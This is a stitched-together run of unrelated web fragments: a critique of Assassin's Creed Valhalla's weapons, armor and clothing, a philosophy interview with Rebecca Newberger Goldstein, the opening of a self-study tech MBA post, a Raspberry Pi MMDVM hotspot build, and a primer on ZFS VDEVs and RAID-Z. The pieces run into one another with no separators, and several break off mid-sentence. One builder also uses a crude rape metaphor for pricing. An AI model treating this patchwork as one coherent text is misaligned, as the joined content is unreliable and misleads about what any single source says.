<p>(yes, the odd decision to use and then not use the Oxford comma is preserved from the original).  That is <em>Valhalla’s </em>version of the statement.  <strong>That statement is making a claim about the product that follows</strong>.  Some of those claims are explicit (this is based on real history at some level) and some are implicit (our diverse team means this game was produced in a careful, sensitive way).  <strong>And those claims deserve interrogation.</strong></p>

<h2>The Nitpicks</h2>



<p>My thoughts on <em>Valhalla</em> fit into two main categories: complaints of historical accuracy that I think are largely unimportant, but fun to note, and<strong> complaints about tone and framing which I think <em>are</em> important and worth discussing</strong>.  <strong>We can start with the frivolous stuff</strong>.  If you want to skip to the meat of the analysis, you are welcome to jump right to the next section, but I know some folks like to know about this stuff, so here it is.</p>



<p><strong>First off, because it is a core area of my specialty: the weapons and armor.  </strong>The military equipment we see here is very hit-or-miss and<strong> there are honestly quite a lot of misses</strong>.  They at least have, for the most part, the relatively light design of battle axes correct, in both their two-handed and one-handed varieties.  And I can understand from a game design standpoint the decision to not give the player a one-handed sword and to instead fill that role with the more iconic one-handed axe; NPCs use one-handed swords, so it isn’t that they don’t exist, merely that our character doesn’t prefer them.  Technically, sword-and-shield and spear-and-shield are both possible, but only with a high level perk, which is pretty silly given that these were the most common non-elite fighting styles of the era by some distance.</p>



<p>But things go poorly from there.  There is a ‘flail’ type weapon, despite – <a href="https://acoup.blog/2019/06/07/collections-the-siege-of-gondor-part-v-just-flailing-about-flails/">as we’ve discussed</a>, actually – flail chain weapons being both not of this period, poorly attested in general and also not common in this part of the world in <em>any </em>period.  The large two-handed swords – the only kinds of swords the player can use – are around <em>three hundred</em> years too early and don’t really resemble their later variations either (they are much too thick and heavy, being mostly up-scaled period swords, which makes them look absurd).  And yes, there were two-handed swords in antiquity in Thrace and Illyria (the falx and rhomphaia) but this is both not that part of the world, not antiquity, and these are not those swords.  I am befuddled that, with two other two-handed weapons that fit the period (a thrusting spear and a two-handed axe) that they felt the need to include ‘greatswords.’  Also, they are carried by way of back-scabbards, which…sigh…no.</p>



<p><strong>The armor is generally a bigger ‘miss’ than the weapons.</strong>  There is a <em>lot</em> of soft ‘leather’ armor here of exactly the sort that was not used historically.  What is baffling uncommon is <em>mail</em> – especially among the Norse and Danes (there’s a bit more mail on the Saxons) –  which would have been, in this period, by far the most common metal body protection.  Pretty much all of Eivor’s warrior band ought to be wearing mail.  Instead, there is a lot of scale armor; scale was certainly used in this period in England, but it was a lot less common than mail (there are also things like brigandine armor roughly 400 years too early).  I have noticed a real trend of game developers using lots of scale armor when mail would be more correct; I wonder if it is easier for an art-team to produce the assets for it or if they think it looks cooler.  But in any event, audiences looking for a realistic sweep of ninth century equipment will not find it here.  I would say, for the more ‘exotic’ player armors, that I think the developers here missed a trick – the game sets up early that we have people from the Near East and even the Far East in the player’s clan.  I think that would set up an opportunity to have the honestly rather more varied and potentially visually interesting armors from the Near East – a lot more scale, but also Near Eastern lamellar or even Chinese-style lamellar coats.  Alas, no.</p>

Even vikings <strong>cared</strong> about their appearances!</figcaption></figure>



<p>In terms of <em>clothing</em>, it is both hit and miss, but a bit more hit than miss compared to equipment.  Some of the Norse and Danish wear is ‘hollywood barbarian’ (lots of rough fur, inexplicably low-coverage clothing in freezing climates, lots of random leather) which remains truly frustrating.  But <em>most</em> of the clothing isn’t this way.  One odd area is color: <strong>medieval clothing, contrary to what you often see in films, was <em>colorful</em>, often with lots of bold primary colors</strong> (bright reds, yellows, greens, blues).  In <em>Valhalla</em>, the developers have opted to use clothing color to signify faction (friendly Danes wear green, the Norse blue, hostile Danes red, hostile Saxons yellow) and to keep non-combatants in drab colors.  I get the design reason (they want you to pay attention to enemies, not non-combatants) but it is frustrating, apart from the monks, that this makes so many of the townsfolk drab and dull.  <strong>Still, it was very nice to see Norse and Danes in bright primary colors, often with lovely border-stitching on their clothes and lots of clear care.</strong></p>



<p>In terms of architecture, I very much like that buildings in settlements, especially high status ones, are often well built, with lots of designs and carving work in the wood.  I am less thrilled with the way churches are done: typically in plain stone with plaster; some color is often added by lighting effects through stained glass.  But these are medieval Catholic churches, they should be brightly painted and colored in the interior and in most cases – <em>especially</em> in big towns and monasteries – very well kept up.  If you want to see this done better, <strong><em>Kingdom Come: Deliverance</em> is a deeply flawed game that nevertheless does medieval town architecture and clothing quite a lot better</strong> (but maybe watch a Let’s Play; while <em>KC:D </em>is fun once it gets properly going, it’s a case where I don’t think the juice is worth the squeeze; I invested the time to get properly into the game and I don’t think it was really worth it).</p>

Also, why are the big banners so ragged and faded?  This is an active religious center!  It would be kept <strong>clean</strong> and <strong>well cared for</strong>!</figcaption></figure>



<h2>Diversity</h2>



<p>This isn’t really a nitpick or a substantive issue, so I am giving it its own section in between the two.  Let me be frank: <strong>I fully understand the desire of the developers to deviate from history on some of these points in order to make a more inclusive game</strong>.  These games do not market themselves as pure historical simulations, so this does not bother me; in fact I think it is broadly a positive thing that game studios are doing this (so long as they are <em>open</em> about fudging the history).  So if you were hoping for a lot of table-pounding here, you are bound to be disappointed.  Still, we’re assessing the game historically, so it seems worthwhile to point some of these things out.</p>



<p>First, on gender diversity, so far the game has built up a quiet contrast between the English, who are gender-stratified, and the Norse and Danes, who are much less so.  Saxon troopers are all male, but Danish and Norse NPCs include women.  All of the Saxon leaders I’ve met so far in the game are male, while one of the first jarls you meet in England is a woman ruling in her own name.  Saxon clothing is sharply gendered (men in pants, women in dresses), but Norse and Danish clothing generally isn’t (which is a clear design choice, since this is very much <em>not</em> true historically).  And, as with <em>AC: Odyssey</em>, if you play a female main character, absolutely no one seems to care or notice.</p>



<p>Now, on the one hand, there isn’t <em>nothing</em> to this characterization.  <a href="https://en.wikipedia.org/wiki/Shield-maiden">‘Shield-maidens’</a> do show up in the …</p></div></div>

After all, why is it even worthwhile to struggle to know Reality, to struggle after anything at all, if the self that’s motivating the struggle is ultimately nothing at all?</em>'</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4f9aa5c205.jpg"></p><p><a href="http://www.santafe.edu/people/profile/rebecca-goldstein"><u>Rebecca Newberger Goldstein</u></a> is an American philosopher, novelist and public intellectual.

There were problems that obsessed me in both fields—How can math be <em>a priori</em>? How can quantum mechanics be connected to a reality that is recognizably our own? I discovered, while in college, that these were actually philosophical problems. My senior year in college I went to speak to one of my professors, Sidney Morgenbesser, an amazing guy. He was the Socrates of his day. Socrates never published anything, but instead engaged in deeply probing dialogues. That was Sidney’s m.o. as well. Over the course of several long conversations Sidney convinced me that I was a philosopher, rather than a scientist. His clinching argument was that scientists are like the bourgeoisie, never questioning the system, whereas philosophers were like socialists, always examining the system critically: even if it seemed to be working, <em>ought</em> it to be working? That argument struck home. I basically applied to graduate school in philosophy on the strength of Sidney’s metaphor.&nbsp;</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4ed28d1e2b.png"></p><p><strong>3:16:</strong> In your book <u>‘<a href="http://www.amazon.co.uk/gp/product/B00KEW8KC4/ref=dbs_a_def_rwt_hsch_vapi_tkin_p1_i1">Plato at the Googleplex</a>’ y</u>ou have Plato brought into our century to discuss philosophy with our contemporaries. So first, can you say what you take philosophy to be and why you think it hasn’t gone away and isn’t going away soon?</p><p><strong>RNG:</strong> I think that philosophy is the systematic and rigorous investigation of one of the deepest urges that we humans have, which is the urge to get our bearings in the most general sense possible. In particular, (1) We want to know where we are. What is the nature of this universe in which we find ourselves? What fundamentally different kinds of things, belonging to different ontological categories, are there, and how do they operate? 2. We want to know our own place in the universe, whether we’re made of the same stuff, are a special category of being, and whether the universe itself has any attitudes towards us. 3. We want to know what we are meant to do with our lives. We want to know what it is to live a life worthy for a human to live, a good life.&nbsp;</p><p>The first two questions are ontological, the third is normative. Science, as it eventually developed, has the lead role in answering the ontological questions, but science is often pushed on by philosophy, in its critical probing role. And the more subtle the science becomes, the bigger the role for philosophy, since it falls to philosophy’s special techniques to figure out what is and isn’t entailed by the science. For example, what changes are we required to make to our concept of time in light of Relativity Theory? And as far as the normative questions go, there the ball falls squarely in philosophy’s court, though it’s sometimes advancements in science and technology that generate the balls, that is, new normative questions.&nbsp;</p><p>Consider the normative questions generated by advances in AI, or the question of what obligations we have to future generations, given the threat of climate change. As long as science and technology advance, philosophers will have new questions to work on.</p><p><strong>3:16:</strong>&nbsp; You place Plato in rooms having philosophical debates with all sorts of people but you never have him decisively concluding a debate or argument. For those hostile to philosophy this might be a hostage to fortune – it suggests that philosophy can’t decide anything and actually we would be better off listening to scientists, historians and novelists. Why should we heed the philosopher in our time if not even Plato can answer its questions? What do you say to those physicists who say philosophy is just pointless and has been supplanted by – well, in their case – physics?&nbsp;</p><p><strong>RNG:</strong> When it comes to ontology, I would argue that it’s science that plays the leading role. But I’d have to offer a philosophical argument to support that conclusion. I'd first have to both differentiate what is essential to science, how it differs from other fields of inquiry, including philosophy, and I’d have to argue for scientific realism, that is argue that science is in the business of ontology. Both of those are conclusions that can’t be empirically established, i.e. they are philosophical. So one can’t even make the case for science, ontologically speaking, without engaging in philosophy. And as far as the normative questions go, we are entirely in the philosophical sphere. And here I do think philosophy has offered us answers, answers which have as fundamentally changed our lives, and for the better, as the technological advances that science has given us.&nbsp;</p><p>As just one example, consider the idea of human rights. One of my points in my having Plato engage in those philosophical dialogues in which it’s not he who supplies the answer, but instead he is rather surprised by being philosophically instructed by some “regular” people, was to demonstrate the progress we’ve made since Plato, progress that has been disseminated and seeped into the points of view of non-philosophers. In the first dialogue a rather down-to-earth character, a media escort, explains to Plato in very commonsensical terms why slavery is wrong. Plato had argued that it’s wrong for Greeks to enslave other Greeks, which was an advance over the norm taken for granted by his society, but he never universalized the conclusion. Nor did Aristotle, who argued that some people are naturally suited to be slaves. So if I don’t have Plato having all the answers it’s often to show progress made in the millennia since he lived, or to show that our new conditions, many of them created by scientific and technological advances, generate new philosophical problems--in other words to show that philosophy will never go away. My showing Plato to be often instructed and/or stumped is meant to challenge the view that philosophy remains static.</p><p><strong>3:16:</strong>&nbsp; So this leads to one of the issues you raise in the book - the notion of philosophical progress. So what do you take to be the progress philosophy has made since Plato and why is it invisible to many, unlike science?&nbsp;</p><p><strong>RNG:</strong> Philosophical advances in epistemology and in ethics profoundly shape our points of view. We don’t see them precisely because we see with them. It’s like the fish who responds to the question “How’s the water today?” with “Water? What’s water?” When people hold the view, for example, that science has discovered that simultaneity is not absolute, as counter-intuitive as that seems, or that chattel slavery is an abomination, which once also had seemed counter-intuitive, they don’t realize the laborious philosophical reasoning that had laid the groundwork for their views. It takes philosophical work to claim that science can correct our fundamental views of the way the world is. It takes philosophical work to claim that we can discover, without consulting any holy books (that in fact sanction slavery), truths about the way humans can and can’t be treated. Philosophy is committed to the view that we can use human reason to come to ethical conclusions, overcoming biases, tradition, and religious authority. Just the other week the Pope gave his approval to civil unions for gay people. That is the slow progress of the philosophical idea of human rights working its way out. You could even consider such changes in ethical attitudes, eventually making their way even to the Vatican, as philosophy’s own technological products, the practical application of philosophical conclusions, analogous to the technological goodies that have come from science. In fact, you can even regard science itself as one of philosophy’s technological products, the practical application of certain epistemological conclusions.&nbsp;</p><p><img src="https://static.s123-cdn.com/uploads/2029468/2000_5fb4edb79cae4.png"></p><p><strong>3:16:</strong>&nbsp; You’ve written about <u><em>Gödel</em></u><a href="http://www.bookdepository.com/Incompleteness-Rebecca-Goldstein/9780393327601?ref=grid-view&amp;qid=1605692840648&amp;sr=1-1"><u><em>’s incompleteness theorems</em></u></a>. …</p></div></div></div></div></div></div></section></div></div></div></div>

            <!--kg-card-begin: markdown--><p>I reached a point in my career a few years ago where I wished I <em>had</em> an MBA, but it was difficult to <em>get</em> an MBA. It would be hard to stop working and get one, hard and expensive to find the time to do a part-time one, and I wasn't working for a place that would pay for one at the time.</p>
<p>I don't need the structure of an MBA program to provide motivation, and I'm not afraid to read. So I decided instead to just focus my reading practice towards an MBA curriculum.</p>
<p>My focus was on a <em>Tech</em> MBA which to me means learning about how to start, grow, and manage technology companies. The curriculum would need all the typical core classes, but electives that focus on technology leadership.</p>
<p>My research found all sorts of great sources for ideas:</p>
<ul>
<li>The assigned books of the top traditional MBA programs, and more tech-focused programs such as the <a href="http://www.stern.nyu.edu/programs-admissions/tech-mba/program">Stern Tech MBA</a>, <a href="https://tech.cornell.edu/programs/masters-programs/johnson-cornell-tech-mba">Cornell Tech MBA</a>, <a href="https://mitsloan.mit.edu/">MIT Sloan</a> (<em>cool, they used a <a href="https://blog.davidtate.org/clear-and-present-leadership/">blog post</a> of mine in a <a href="https://sloanreview.mit.edu/article/best-of-this-week-creative-culture-interviews/">weekly link roundup</a></em>), and <a href="https://www.cs.cmu.edu/master-science-product-management">CMU's Masters of Product Management</a>.</li>
<li><a href="https://personalmba.com/">Personal MBA book and reading list</a>.</li>

    <p>If you’re reading this post on my new LoneStar Electronics MMDVM hotspot, then you no doubt decided to explore the option of buiding one yourself after noting the price of some of the commercially available hotspots. For example the Zumspot form Ham Radio Outlet retails between $150 - $160, and that’s not including a case to safeguard it. And let’s not forget about BridgeCom Systems who absolutely rape you on the price of their SkyBridge Hotspot; $299 is rip off.</p>
<p>So, “What did you build and what did it cost?” you ask. I built a simple small form MMDVM hotspot using the LoneStar MMDVM Simplex Board. Combined cost for the build is $140, and if you want the OLED screen you can add on another $10 for a total $150. Now before you start complaining there are Jumbospots on eBay for $75, let me remind you that those are made from questionable components. If you want to purchase one of these, fine but don’t be surprised if it underperforms or completely dies on you. That’s the price you pay for not paying full price.</p>
<h2 id="background">Background</h2>
<p>Before we dive into the build, allow me give you a little background of my motivations behind this project and my requirements. To begin with, I believe the cost of commercially available hotspots is too high provided the quality of components used. Second, I didn’t like any of the available options on the market.</p>
<p>I think the OLED screen that’s attached to most MMDVM boards is ridiculously small. During my research on hotspot cases, I came across the line of cases from C4Labs with either 2.4” or 3.5” Nextion screens. This intrigued me because they are so much bigger than the OLED screens attached to the MMDVM boards. Bigger is better right?! Well… it turns out the screen is just a novelty and doesn’t provide any functionally beyond displaying which room/reflector/talkgroup you’re connected to and the callsign of the current person speaking. My Yaseu FT3D already does this for me. I asked around and couldn’t find anyone who thought it was a must have feature. Knowing this, I decided that I didn’t need either the OLED or Nextion screen. However, I still want the option to attach a screen to my hotspot should I change my mind in the future.</p>
<p>One of the biggest complaints against hotspots is the accusation that it isn’t real ham radio because most users operate them within ten feet of themselves. Personally I don’t care what you’re opinion on this topic is, the fact of the mater is that I’m going to be within ten feet of my hotspot when I employ it. With such limited distances between the users and their hotspot, I challenge the need for SMA connectors attached to the MMDVM board. The connectors are just soldered onto the board with nothing more to secure them in place. Luckily the MMDVM board I want to use comes with a ceramic antenna surface mounted onto the board. No need for me to worry about breaking the solder joints on a SMA connector.</p>
<p>With that out of the way, let’s move onto the parts utilized for this build.</p>
<h2 id="parts-list">Parts List</h2>

<p>The most essential component of a hotspot is the MMDVM board. I want the most superior performance and quality for my hotspot, so I don’t want to compromise by buying a cheap MMDVM board. The LoneStar MMDVM Simplex Board, designed by N5BOC David Dennis, is considerable more expensive than other MMDVM boards, however it’s constructed of higher-quality components and has the following features:</p>
<ul>
<li>It has its own dedicated 3.3V regulator and does not pull voltage off of the noisy Raspberry Pi 3.3V line like all other simplex board do.</li>
<li>The board is a four layer PCB with large ground planes for 3.3V and GND sandwiched in the middle of the PCB. This acts as one very large decoupling cap the size of the entire board. Also this isolates signals between top side and bottom side.</li>
<li>All of the Analog RF signals are on the top side only and the high harmonic digital signals are all kept isolated on the bottom side. Making this board much more stable. It should also make it more sensitive on receive.</li>
</ul>
<h3 id="c4labs-jrz-1s-case">C4Labs JRZ-1S Case</h3>

</figure>

<p>I like this case; it’s modest yet does the job very well once it’s completely together. As an added touch of class, I went with the wood inlays. I also sanded the sides of the case with 400 grit sandpaper to give it that frosted glass look. I appreciate how it turned out. The actual case is engineered very well with the components fitting in securely inside. Interestingly enough one layer of the case does include holes drilled in it to support the prongs of an SMA connector. It’s a thoughtful touch, but I’m keenly uninterested in trying to find out how well they work.</p>
<h3 id="raspberry-pi-zero-wh">Raspberry Pi Zero WH</h3>

</figure>

<p>Nothing extremely exceptional about this other than I purchased it from Adafruit. I went with the Zero WH instead of the Zero W, because I don’t know how to solder very well and didn’t want to ruin the thing. One of these days I need to force myself to learn and become better.</p>
<h2 id="the-finished-build">The Finished Build</h2>

<p>Here’s the finished hotspot. If you look in the top right-hand corner above the heatsink, you’ll recognize the ceramic antenna. With the hotspot located in my basement, I’m nevertheless able to connect to it will my Yaesu FT3D running 300 mW. Should I want to ever want to attach a screen I can because there are connections present for the Nextion and OLED displays. The only gripe I have remains the location of the micro-USB port on the Pi Zero. If you couldn’t determine from the photo the case is upside down. Well, I can’t do anything about that so, I’ll have to live with it. Overall I’m impressed with the build quality of the hotspot and look forward to using it for years to come.</p>

            <!-- content --><p>ZFS has become increasingly popular in recent years. ZFS on Linux (ZoL) has pushed the envelope and exposed many newcomers to the ZFS fold. iXsystems has adopted the newer codebase, now called <strong>OpenZFS, </strong>into its codebase for TrueNAS CORE. The purpose of this article is to help those of you who have heard about ZFS but have not yet had the opportunity to research it.</p>
<p>Our hope is that we leave you with a better understanding of how and why it works the way it does. Knowledge is key to the decision-making process, and we feel that ZFS is something worth considering for most organizations.<br>
<span id="more-44288"></span></p>
<h2>What is ZFS?</h2>
<p>ZFS is a <strong>filesystem</strong>, but unlike most other file systems it is also the <strong>logical volume manager</strong> or LVM. What that means is ZFS directly controls not only how the bits and blocks of your files are stored on your hard drives, but it also controls how your hard drives are logically arranged for the purposes of RAID and redundancy. ZFS is also classified as a <strong>copy-on-write</strong> or <a href="https://www.ixsystems.com/documentation/freenas/11.2/zfsprimer.html">COW filesystem</a>. This means that ZFS can do some cool things like <strong>snapshots</strong> that a normal filesystem like NTFS could not. A snapshot can be thought of like it sounds, a photograph of how something was at a point in time. How a COW filesystem works, however, has some important implications that we need to discuss.</p>

<p>Hard Drives work such that the pieces of your data are stored in <strong>Logical Block Addresses</strong>, or LBAs. ZFS is aware of what LBAs a specific file is stored in. Let us say we need to write a file that is big enough to fit into 3 blocks. We are going to store that file in LBA 1000, 1001, and 1002. This is considered a sequential write, as all of these blocks are stored directly next to each other. For spinning hard drives, this is ideal, as the write head does not have to move off of the track it is on.</p>
<figure id="attachment_23424" aria-describedby="caption-attachment-23424"><a href="https://www.servethehome.com/western-digital-red-pro-10tb-nas-hdd-review/wd-red-10tb-pro-nas-top/" rel="attachment wp-att-23424"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg" alt="WD Red 10TB Pro NAS Top" width="800" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg 800w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-305x300.jpg 305w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-696x684.jpg 696w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-427x420.jpg 427w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-23424">WD Red 10TB Pro NAS Top <a href="https://www.servethehome.com/wd-red-smr-vs-cmr-tested-avoid-red-smr/">Use CMR with ZFS, not SMR</a></figcaption></figure>
<p>Now, let us say we make a change to the file and the part that was stored at LBA 1001 needs to be modified. When we write that change, ZFS does not over-write the part of the file that was stored in 1001. Instead, it will write that block to LBA 2001. LBA 1001 will be kept as-is until the snapshot keeping it there expires. This allows us to have both the current version of the file, and the previous one, while <em>only storing the difference.</em> However, the next time we go to read the file back, the read head of our spinning hard drive needs to read LBA 1000, go to the track where LBA 2001 is stored, read that, and then go back to the track where LBA 1002 is stored. This phenomenon is called <strong>fragmentation.</strong></p>
<h2>A Primer on ZFS Pool Design</h2>
<p>To make ZFS pools easier to understand, we are going to focus on using small storage containers as you may have around the house or shop. Before we continue, it is worth defining some terms. A <strong>VDEV, </strong>or virtual device, is a logical grouping of one or more storage devices. A <strong>pool</strong> is then a logically defined group built from 1 or more VDEVs. ZFS is very customizable, and therefore, there are many different types of configurations for VDEVs. You can think of the construction of a ZFS pool by visualizing the following graphic:</p>
<figure id="attachment_45011" aria-describedby="caption-attachment-45011"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg" alt="Nested Storage Containers" width="696" height="453" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-400x261.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1536x1001.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-2048x1334.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-696x453.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1068x696.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-645x420.jpg 645w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45011">Nested Storage Containers</figcaption></figure>
<p>Starting from the smallest container size, we have our drives. We can see that in this visualization we have two drives in each larger container. These two larger containers are our VDEVs. The single largest container, then, is our pool. In this configuration, we would have each pair of drives in a <strong>mirror. </strong>This means that one drive can fail in either (or both!) VDEV and the pool would continue to function in a <strong>degraded</strong> state.</p>
<figure id="attachment_45012" aria-describedby="caption-attachment-45012"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg" alt="Two Mirrors, Each VDEV with One Bad Drive" width="696" height="468" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-400x269.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1536x1034.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-2048x1378.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-696x468.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1068x719.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-624x420.jpg 624w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45012">Two Mirrors, Each VDEV with One Bad Drive</figcaption></figure>
<p>However, if 2 drives in a <strong>single</strong> VDEV, all of the data in our entire pool is lost. There is no redundancy of the pool itself, all redundancy in ZFS is in the VDEV layer. If one <em>VDEV</em> fails, there is not enough information to rebuild the missing data.</p>
<figure id="attachment_45013" aria-describedby="caption-attachment-45013"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg" alt="Two Mirrors, One VDEV where Both Drives Failed" width="696" height="486" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-400x280.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1536x1074.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-696x487.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1068x747.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-601x420.jpg 601w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-100x70.jpg 100w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed.jpg 1991w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45013">Two Mirrors, One VDEV where Both Drives Failed</figcaption></figure>
<p>Next, we need to define what&nbsp;<strong>RAID-Z</strong> is and what the various levels of RAID-Z are. RAID-Z is a way of putting multiple drives together into a VDEV and storing <strong>parity,&nbsp;</strong>or fault tolerance. In ZFS, there is no dedicated “parity drive” like in&nbsp;<strong>Unraid</strong>, but it instead stores parity across all of the drives in the VDEV.&nbsp; The amount of parity that is spread across the drives determines the level of RAID-Z. It is in this way more similar to traditional hardware RAID.</p>
<p>What can make RAID-Z a better approach than a mirrored configuration is that it does not matter <em>what&nbsp;</em>drive fails in a RAID-Z. Each drive is an equal partner, whereas, in a mirrored configuration, each mirrored VDEV is a separate entity. This benefit of RAID-Z comes at the cost of performance, however, and a mirrored pool will almost always be <em>faster</em>&nbsp;than RAID Z.</p>
<p><strong>RAID-Z</strong>&nbsp;is similar to a traditional&nbsp;<strong>RAID 5. </strong>In RAID-Z you have one drive worth of parity. In other words, if you lose one drive, your pool will continue to function. For RAID-Z you need a minimum of 3 drives per VDEV. You can have 3, 7, or even 12 drives in a RAID-Z VDEV. The more drives which you add, however, the longer it will take to <strong>resilver,&nbsp;</strong>or rebuild.</p>
<p>This increased time increases the risk of your data, as a second drive failure during this process would destroy your pool. ZFS will resilver while the data is still in use, it is a live recovery. The implication of this is that our disks are working harder than usual during this process, and this can increase the chances of a second drive failure. Your data is still accessible and in production, while it is reading all of the parity data from the existing members of your VDEV and then writing it to the new disk.</p>
<figure id="attachment_45014" aria-describedby="caption-attachment-45014"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg" alt="A Pool with a Single 3-Disk Raid Z1 VDEV" width="696" height="495" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--800x569.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--400x285.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1536x1093.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--2048x1458.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--696x495.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--1068x760.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--590x420.jpg 590w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Raid-Z1--100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45014">A Pool with a Single 3-Disk Raid-Z VDEV</figcaption></figure>
<p>A RAID-Z2 VDEV is more akin to a RAID 6. In this configuration, 2 drives worth of parity is stored across all of your devices. You can lose up to two drives per VDEV and your pool will still function. Adding more parity drives increases calculations required which means you need more processing performance to operate the array.</p>

<p>Finally, a RAID-Z3 VDEV provides three drives worth of parity, so you can lose up to three drives per VDEV and your pool will still function. <strong>The more drives of parity you add, however, the slower your performance ends up being</strong>. You need a minimum of four but should use at least five drives to build a RAID-Z3 VDEV.</p>
<h2>The Need for Speed</h2>
<p>There are two ways in which we measure speed or <em>fastness</em>,&nbsp;<strong>IOPS,</strong>&nbsp;and&nbsp;<strong>Throughput</strong>. In RAIDZ, more drives will give you more throughput, or the actual read and write speed you see when transferring files. However, if you have ever tried to run multiple file copies in Windows simultaneously, you may have noticed the more you do, the slower it gets. It does not always get slower at a constant rate, the more you try to do disks will get exponentially slower. This is because your disk can only do so many Input/Output Operations per Second, or IOPS.</p>
<p>RAIDZ will scale in&nbsp;<em>throughput</em>&nbsp;with the more disks you add, but it does not scale with&nbsp;<em>IOPS.</em> What that generally means is, RAIDZ is not traditionally the best choice for I/O intensive workloads, as the amount of IOPS is roughly limited to the slowest member of our VDEV if we exclude all of the caching ZFS has. Virtualization, as we are discussing here, is highly dependent on I/O.</p>
<p>Earlier, we discussed that ZFS is a COW filesystem, and because of that it suffers from data fragmentation. There are direct performance implications that stem from that fact.&nbsp;<strong>The more “full” your pool is, the slower it will ultimately get.&nbsp;</strong>Write speeds in ZFS are directly tied to the amount of&nbsp;<em>adjacent</em> free blocks there are to write to. As your pool fills up, and as data fragments, there are fewer and fewer blocks that are directly adjacent to one another. A single large file may span blocks scattered all over the surface of your hard drive. Even though you would expect that file to be a sequential write, it no longer can be if your drive is full.</p>
<figure id="attachment_45006" aria-describedby="caption-attachment-45006"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png" alt="Seagate Mobile HDD Crystal Disk Mark Performance" width="482" height="351" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png 482w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-400x291.png 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-324x235.png 324w" sizes="(max-width: 482px) 100vw, 482px"><figcaption id="caption-attachment-45006">Seagate Mobile HDD Crystal Disk Mark Performance</figcaption></figure>
